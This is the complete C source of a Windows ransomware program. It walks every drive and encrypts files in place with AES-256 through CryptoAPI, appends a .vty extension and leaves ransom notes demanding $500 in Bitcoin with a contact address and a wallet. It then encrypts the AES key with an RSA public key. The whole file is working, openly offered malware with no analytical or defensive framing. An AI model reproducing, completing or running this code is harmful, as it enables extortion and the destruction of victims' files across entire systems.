#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include "dirent.h"
#include <time.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#define _CRTDBG_MAP_ALLOC
#include <crtdbg.h>
#pragma comment(lib,"Crypt32.lib")

#define PATH_SEPARATOR '\\'
#define BUFFER_SIZE 1024
#define VTY_EXTENSION ".vty"
#define RANSOM_NOTE "README_VTY.txt"

void displayErrorMessage(DWORD errorCode) {
    LPSTR messageBuffer = NULL;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&messageBuffer,
        0,
        NULL);

    if (messageBuffer != NULL) {
        printf("Error: %s\n", messageBuffer);
        LocalFree(messageBuffer);
    }
    else {
        printf("Error: Unable to get error message for code %d\n", errorCode);
    }
}

void printBanner() {
    printf("\n");
    printf("██╗  ██╗ ██████╗  █████╗ ███╗   ██╗██╗   ██╗██╗  ██╗\n");
    printf("██║ ██╔╝██╔═══██╗██╔══██╗████╗  ██║╚██╗ ██╔╝╚██╗██╔╝\n");
    printf("█████╔╝ ██║   ██║███████║██╔██╗ ██║ ╚████╔╝  ╚███╔╝ \n");
    printf("██╔═██╗ ██║   ██║██╔══██║██║╚██╗██║  ╚██╔╝   ██╔██╗ \n");
    printf("██║  ██╗╚██████╔╝██║  ██║██║ ╚████║   ██║   ██╔╝ ██╗\n");
    printf("╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝\n");
    printf("                  ENCRYPTOR v1.0                      \n");
    printf("=======================================================\n\n");
}

char* generateKey() {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const size_t stringLen = 256;
    char* randomString = (char*)malloc((stringLen + 1) * sizeof(char));

    if (randomString != NULL) {
        srand((unsigned int)time(NULL));
        for (int i = 0; i < stringLen; ++i) {
            randomString[i] = charset[rand() % (sizeof(charset) - 1)];
        }
        randomString[stringLen] = '\0';
    }
    return randomString;
}

void createRansomNote(const char* dirPath) {
    char notePath[BUFFER_SIZE];
    snprintf(notePath, sizeof(notePath), "%s%c%s", dirPath, PATH_SEPARATOR, RANSOM_NOTE);
    
    HANDLE hNote = CreateFileA(notePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hNote != INVALID_HANDLE_VALUE) {
        const char* noteText = 
            "========================================\n"
            "YOUR FILES HAVE BEEN ENCRYPTED!\n"
            "========================================\n\n"
            "All your files have been encrypted with AES-256.\n"
            "They now have the .vty extension.\n\n"
            "To recover your files, you must pay $500 in Bitcoin.\n\n"
            "Contact: decrypt@onionmail.org\n"
            "Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n"
            "Do NOT rename files or try to decrypt them yourself!\n"
            "========================================\n";
        
        DWORD bytesWritten;
        WriteFile(hNote, noteText, strlen(noteText), &bytesWritten, NULL);
        CloseHandle(hNote);
        printf("[+] Ransom note created: %s\n", notePath);
    }
}

void encryptFile(const char* filePath, const char* key) {
    if (strstr(filePath, RANSOM_NOTE) != NULL) return;

    HANDLE hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HCRYPTPROV hCryptProv;
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CloseHandle(hFile);
        return;
    }

    HCRYPTHASH hHash;
    if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hCryptProv, 0);
        CloseHandle(hFile);
        return;
    }

    CryptHashData(hHash, (const BYTE*)key, strlen(key), 0);

    HCRYPTKEY hKey;
    if (!CryptDeriveKey(hCryptProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);
        CloseHandle(hFile);
        return;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwBufferLen = dwFileSize + 64;
    BYTE* pBuffer = (BYTE*)malloc(dwBufferLen);
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL);

    DWORD dwBytesToEncrypt = dwBytesRead;
    if (CryptEncrypt(hKey, 0, TRUE, 0, pBuffer, &dwBytesToEncrypt, dwBufferLen)) {
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        DWORD dwBytesWritten = 0;
        WriteFile(hFile, pBuffer, dwBytesToEncrypt, &dwBytesWritten, NULL);
        SetEndOfFile(hFile);
    }

    free(pBuffer);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hCryptProv, 0);
    CloseHandle(hFile);

    char newFilePath[BUFFER_SIZE];
    strcpy(newFilePath, filePath);
    strcat(newFilePath, VTY_EXTENSION);
    
    if (MoveFileA(filePath, newFilePath)) {
        printf("[+] Encrypted: %s\n", newFilePath);
    }
}

void encryptDirectory(const char* dirPath, const char* key) {
    DIR* dir;
    struct dirent* entry;
    struct stat statbuf;
    char fullPath[BUFFER_SIZE];

    if (!(dir = opendir(dirPath))) return;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(fullPath, sizeof(fullPath), "%s%c%s", dirPath, PATH_SEPARATOR, entry->d_name);
        
        if (stat(fullPath, &statbuf) == 0) {
            if (S_ISDIR(statbuf.st_mode)) {
                encryptDirectory(fullPath, key);
                createRansomNote(fullPath);
            } else {
                if (strstr(entry->d_name, VTY_EXTENSION) == NULL &&
                    strstr(entry->d_name, RANSOM_NOTE) == NULL) {
                    encryptFile(fullPath, key);
                }
            }
        }
    }
    closedir(dir);
}

void encryptAES(const char* key, DWORD keyLen, const char* outFile, const char* pubKeyFile) {
    HANDLE hPublicKeyFile = CreateFileA(pubKeyFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPublicKeyFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error: public_key.pem not found!\n");
        return;
    }
    
    DWORD publicKeyLength = GetFileSize(hPublicKeyFile, NULL);
    BYTE* publicKeyData = (BYTE*)malloc(publicKeyLength + 1);
    
    DWORD dwBytesRead = 0;
    ReadFile(hPublicKeyFile, publicKeyData, publicKeyLength, &dwBytesRead, NULL);
    publicKeyData[publicKeyLength] = 0;
    CloseHandle(hPublicKeyFile);

    DWORD pubKeyBufSize = 0;
    CryptStringToBinaryA((LPCSTR)publicKeyData, publicKeyLength, CRYPT_STRING_BASE64HEADER, NULL, &pubKeyBufSize, NULL, NULL);

    BYTE* pubKeyBuf = (BYTE*)malloc(pubKeyBufSize);
    CryptStringToBinaryA((LPCSTR)publicKeyData, publicKeyLength, CRYPT_STRING_BASE64HEADER, pubKeyBuf, &pubKeyBufSize, NULL, NULL);
    free(publicKeyData);

    DWORD pubKeyInfoLen = 0;
    CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, pubKeyBuf, pubKeyBufSize, CRYPT_DECODE_ALLOC_FLAG, NULL, NULL, &pubKeyInfoLen);

    CERT_PUBLIC_KEY_INFO* pubKeyInfo = (CERT_PUBLIC_KEY_INFO*)malloc(pubKeyInfoLen);
    CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, pubKeyBuf, pubKeyBufSize, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen);
    free(pubKeyBuf);

    HCRYPTPROV hProv;
    CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

    HCRYPTKEY hPubKey;
    CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hPubKey);
    free(pubKeyInfo);

    DWORD bufLen = keyLen + 64;
    BYTE* encryptedKey = (BYTE*)malloc(bufLen);
    memcpy(encryptedKey, key, keyLen);

    DWORD encLen = keyLen;
    CryptEncrypt(hPubKey, 0, TRUE, 0, encryptedKey, &encLen, bufLen);

    HANDLE hOut = CreateFileA(outFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hOut, encryptedKey, encLen, &written, NULL);
        CloseHandle(hOut);
        printf("[+] AES key encrypted and saved\n");
    }

    free(encryptedKey);
    CryptDestroyKey(hPubKey);
    CryptReleaseContext(hProv, 0);
}

int main() {
    printBanner();
    
    char* key = generateKey();
    DWORD keySize = 256;
    
    printf("[*] Target: ALL DRIVES\n");
    printf("[*] Extension: .vty\n");
    printf("[*] Ransom note: README_VTY.txt\n\n");
    
    DWORD drives = GetLogicalDrives();
    char rootPath[4] = "A:\\";
    
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            rootPath[0] = 'A' + i;
            printf("[*] Encrypting drive: %s\n", rootPath);
            encryptDirectory(rootPath, key);
            createRansomNote(rootPath);
        }
    }
    
    printf("\n[*] Encrypting AES key...\n");
    encryptAES(key, keySize, "C:\\encrypted_aes_key.bin", "C:\\public_key.pem");
    
    free(key);
    
    printf("\n========================================\n");
    printf("[+] ENCRYPTION COMPLETE!\n");
    printf("[+] All files now have .vty extension\n");
    printf("========================================\n\n");
    
    system("pause");
    return 0;
}